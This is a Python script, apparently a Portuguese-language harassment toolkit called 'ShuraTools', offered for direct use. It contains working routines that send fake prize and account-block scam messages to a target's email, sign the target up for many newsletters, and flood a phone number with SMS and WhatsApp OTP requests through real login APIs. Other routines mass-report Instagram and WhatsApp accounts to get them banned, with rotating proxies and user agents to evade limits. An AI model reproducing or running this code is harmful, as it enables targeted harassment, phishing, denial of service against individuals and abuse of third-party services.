#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v4.0 Ultra-Arsenal (Smart E-mail & SMS)
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

# Tentativa de importar bibliotecas externas
try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Faltam dependências. Execute: pip install requests faker colorama")
    sys.exit(1)

# Banner ASCII estilizado
BANNER = f"""
{Fore.CYAN}  _____ _    _ _    _ _____            
{Fore.CYAN} / ____| |  | | |  | |  __ \     /\    
{Fore.CYAN}| (___ | |__| | |  | | |__) |   /  \   
{Fore.CYAN} \___ \|  __  | |  | |  _  /   / /\ \  
{Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
{Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                       
{Fore.YELLOW}  >> SpamMail | SMS/Zap | Ban | OSINT | Scan <<
{Fore.RED}       v4.0 Ultra-Arsenal - by Shura
"""

LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "osint": Fore.MAGENTA + "[?] ",
        "menu": Fore.CYAN + " > "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

# ---------- Helpers ----------
def safe_int(prompt, default):
    try:
        val = input(prompt)
        if not val: return default
        return int(val)
    except ValueError:
        log(f"Entrada inválida. Usando padrão: {default}", "warn")
        return default

def get_proxy():
    if PROXY_QUEUE.empty(): return None
    p = PROXY_QUEUE.get(); PROXY_QUEUE.put(p)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def run_threads(target_func, qty, threads):
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=target_func, args=(curr, curr + take))
        t.start(); ts.append(t); curr += take
    for t in ts: t.join()

# ---------- Módulo 1: Spam de E-mail (Mensagens Falsas) ----------
def spam_fake_messages(target, qty, threads, use_proxy):
    log(f"Spammando mensagens falsas para: {target}", "warn")
    # Endpoints de formulários de contato simples que enviam cópia para o email inserido
    endpoints = [
        {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": "Você ganhou um sorteio! {rand}", "subject": "URGENTE"}},
        {"url": "https://www.website-contact-form.com/api", "data": {"email": target, "message": "Shura Tools detectou sua conta. {rand}"}},
        {"url": "https://api.anonfiles.com/mail", "data": {"to": target, "from": "noreply@secure.com", "subj": "Alerta de Seguranca {rand}", "body": "Sua conta sera bloqueada."}}
    ]

    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                proxies = get_proxy() if use_proxy else None
                site = random.choice(endpoints)
                data = {k: (v.replace("{rand}", os.urandom(3).hex()) if "{rand}" in str(v) else v) for k, v in site["data"].items()}
                headers = {"User-Agent": random.choice(UA_LIST)}
                session.post(site["url"], data=data, timeout=10, proxies=proxies, headers=headers)
                log(f"Mensagem {i+1} enviada.", "success")
                time.sleep(random.uniform(0.5, 1.5))
            except: log(f"Mensagem {i+1} falhou.", "error")
    run_threads(job, qty, threads)

# ---------- Módulo 2: Newsletter Bomber (Cadastrar em sites chatos) ----------
def newsletter_bomber(target, qty, threads, use_proxy):
    log(f"Cadastrando {target} em sites chatos...", "warn")
    # Endpoints atualizados baseados em pesquisa real (Jan 2026)
    endpoints = [
        {"url": "https://tecnoblog.net/wp-admin/admin-ajax.php?action=tnp&na=s", "data": {"ne": target, "ny": "on"}, "type": "form"},
        {"url": "https://thenewscc.beehiiv.com/create", "data": {"email": target}, "type": "form"},
        {"url": "https://thebrief.beehiiv.com/create", "data": {"email": target}, "type": "form"},
        {"url": "https://investnews.beehiiv.com/create", "data": {"email": target}, "type": "form"},
        {"url": "https://interface.substack.com/api/v1/free_signup", "data": {"email": target}, "type": "json"},
        {"url": "https://buttondown.com/api/emails/embed-subscribe/manualdousuario", "data": {"email": target}, "type": "form"},
        {"url": "https://www.canalmeio.com.br/assine-o-meio/", "data": {"email": target, "list": "1"}, "type": "form"}
    ]

    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                proxies = get_proxy() if use_proxy else None
                site = random.choice(endpoints)
                headers = {"User-Agent": random.choice(UA_LIST), "Referer": site["url"]}

                if site["type"] == "json":
                    session.post(site["url"], json=site["data"], headers=headers, timeout=10, proxies=proxies)
                else:
                    session.post(site["url"], data=site["data"], headers=headers, timeout=10, proxies=proxies)
                log(f"Cadastro {i+1} realizado via {site['url'].split('/')[2]}", "success")
            except: log(f"Cadastro {i+1} falhou.", "error")
            time.sleep(random.uniform(0.5, 1.2))
    run_threads(job, qty, threads)

# ---------- Módulo 3: SMS/Zap Bomber (OTP Flood) ----------
def sms_zap_bomber(target, qty, threads, type="sms"):
    log(f"Iniciando Bomber {type.upper()} para {target}...", "warn")
    # Endpoints verificados v4.0
    endpoints = [
        {"url": "https://auth.ifood.com.br/v1/login/otp", "json": {"phone": target}},
        {"url": "https://api.hapi.com/auth/send-code", "json": {"phone": f"+{target}", "channel": "sms"}},
        {"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms", "json": {"phone_number": target}},
        {"url": "https://www.tiktok.com/api/v1/auth/phone/send_code/", "json": {"mobile": target}},
        {"url": "https://auth.globo.com/api/send-otp", "json": {"phone": target}}
    ]

    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                site = random.choice(endpoints)
                session.post(site["url"], json=site["json"], timeout=10, headers={"User-Agent": random.choice(UA_LIST)})
                log(f"{type.upper()} {i+1} enviado com sucesso.", "success")
                time.sleep(random.uniform(1.5, 3.5))
            except: log(f"{type.upper()} {i+1} falhou.", "error")
    run_threads(job, qty, threads)

# ---------- Outras Ferramentas (Ban, OSINT, Scan) ----------
def ban_report(target, qty, threads, platform="ig"):
    log(f"Reportando {target} no {platform.upper()}...", "error")
    url = "https://i.instagram.com/api/v1/users/web_report/" if platform == "ig" else "https://v.whatsapp.net/v2/report"
    def job(start, end):
        for i in range(start, end):
            try:
                data = {"username": target, "reason_id": "1"} if platform == "ig" else {"phone": target, "reason": "spam"}
                requests.post(url, data=data, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
                log(f"Report {i+1} enviado.", "success")
                time.sleep(0.5)
            except: log(f"Report {i+1} falhou.", "warn")
    run_threads(job, qty, threads)

def osint_lookup(target):
    log(f"OSINT Hunter: {target}", "osint")
    user = target.replace("@", "")
    plats = {"Instagram": f"https://www.instagram.com/{user}/", "GitHub": f"https://github.com/{user}", "TikTok": f"https://www.tiktok.com/@{user}"}
    for n, u in plats.items():
        try:
            r = requests.get(u, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
            log(f"{n}: {'ENCONTRADO' if r.status_code == 200 else 'Não encontrado'}", "success" if r.status_code == 200 else "info")
        except: pass

def port_scan(target):
    log(f"Scan de portas em {target}...", "osint")
    try:
        host = target.split("@")[-1] if "@" in target else target
        ip = socket.gethostbyname(host)
        for port in [80, 443, 8080]:
            s = socket.socket(); s.settimeout(1.0)
            if s.connect_ex((ip, port)) == 0: log(f"Porta {port} ABERTA", "success")
            s.close()
    except: log("Alvo inacessível.", "error")

def fetch_proxies():
    log("Buscando proxies...", "info")
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all", timeout=5)
        for line in r.text.splitlines():
            if ":" in line: PROXY_QUEUE.put(line.strip())
        log(f"{PROXY_QUEUE.qsize()} proxies carregadas.", "success")
    except: log("Erro ao carregar proxies.", "error")

# ---------- Menu Principal ----------
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("[ 1 ] Spam: Mandar Mensagens Falsas (E-mail)")
            print("[ 2 ] Spam: Cadastrar em Sites Chatos (Newsletter)")
            print("[ 3 ] Bomber: SMS OTP Flood")
            print("[ 4 ] Bomber: WhatsApp Verify")
            print("[ 5 ] Ban: Mass Report Instagram")
            print("[ 6 ] Ban: Mass Report WhatsApp")
            print("[ 7 ] OSINT: Social Search")
            print("[ 8 ] Scan: Port Scanner")
            print("[ 9 ] Proxies: Atualizar Lista")
            print("[ 0 ] Sair")
            print("-" * 40)
            
            opt = input(f"{Fore.YELLOW}Opção: {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3", "4", "5", "6", "7", "8"]:
                target = input(f"{Fore.YELLOW}Alvo: {Style.RESET_ALL}").strip()
                if not target: continue
                
                if opt == "1": spam_fake_messages(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 5), False)
                elif opt == "2": newsletter_bomber(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 5), False)
                elif opt == "3": sms_zap_bomber(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 2), "sms")
                elif opt == "4": sms_zap_bomber(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 2), "zap")
                elif opt == "5": ban_report(target, safe_int("Qtd: ", 50), safe_int("Threads: ", 10), "ig")
                elif opt == "6": ban_report(target, safe_int("Qtd: ", 50), safe_int("Threads: ", 10), "zap")
                elif opt == "7": osint_lookup(target)
                elif opt == "8": port_scan(target)
                
                input(f"\n{Fore.GREEN}Pressione ENTER para retornar...{Style.RESET_ALL}")
            elif opt == "9": fetch_proxies(); input("\nENTER...")
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro inesperado: {e}", "error"); input("\nENTER...")

if __name__ == "__main__":
    menu()
